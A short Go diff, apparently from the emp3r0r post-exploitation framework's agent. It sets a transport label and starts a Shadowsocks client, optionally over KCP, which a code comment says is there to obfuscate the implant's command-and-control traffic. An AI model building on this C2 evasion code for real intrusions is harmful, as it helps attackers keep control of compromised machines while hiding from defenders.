@@ -251,6 +251,15 @@ test_agent:
 					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
 					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
 						agent.RuntimeConfig.ShadowsocksPort)
+					emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", agent.RuntimeConfig.ShadowsocksPort)
+
+					// ss thru KCP, set C2 transport
+					if agent.RuntimeConfig.UseKCP {
+						emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
+							agent.RuntimeConfig.ShadowsocksPort, agent.RuntimeConfig.KCPPort)
+					}
+
+					// run ss w/wo KCP
 					go agent.ShadowsocksC2Client()
 				}
 			}
